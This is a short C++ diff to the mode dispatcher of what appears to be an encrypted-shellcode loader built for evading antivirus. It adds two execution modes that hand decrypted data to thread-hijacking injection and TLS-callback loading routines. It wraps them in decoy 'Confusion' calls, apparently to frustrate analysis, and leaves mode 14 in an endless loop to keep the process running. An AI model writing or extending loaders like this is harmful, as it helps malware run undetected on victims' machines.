@@ -174,6 +174,19 @@ void Launch::launchFunction(std::string function_mode, const unsigned char *decr
         this->printMode("Function 12");
         this->startBase(MasterEncoderForSyscallLoad::function1, decryptedData, byteLength);
         Confusion::generateAndSortArray();
+    }else if (function_mode=="13") {
+        Confusion::generateAndSortArray();
+        this->printMode("Function 13");
+        this->startBase(MasterEncoderForThreadHiijack_InjectLoad::function1, decryptedData, byteLength);
+        Confusion::generateAndSortArray();
+    }else if (function_mode=="14") {
+        Confusion::generateAndSortArray();
+        this->printMode("Function 14");
+        this->startBase(MasterEncoderForTLSCallbackLoad::function1, decryptedData, byteLength);
+        Confusion::generateAndSortArray();
+        while(true){
+
+        }
     } else {
         std::cout << "Invalid function mode!" << std::endl;
         return;
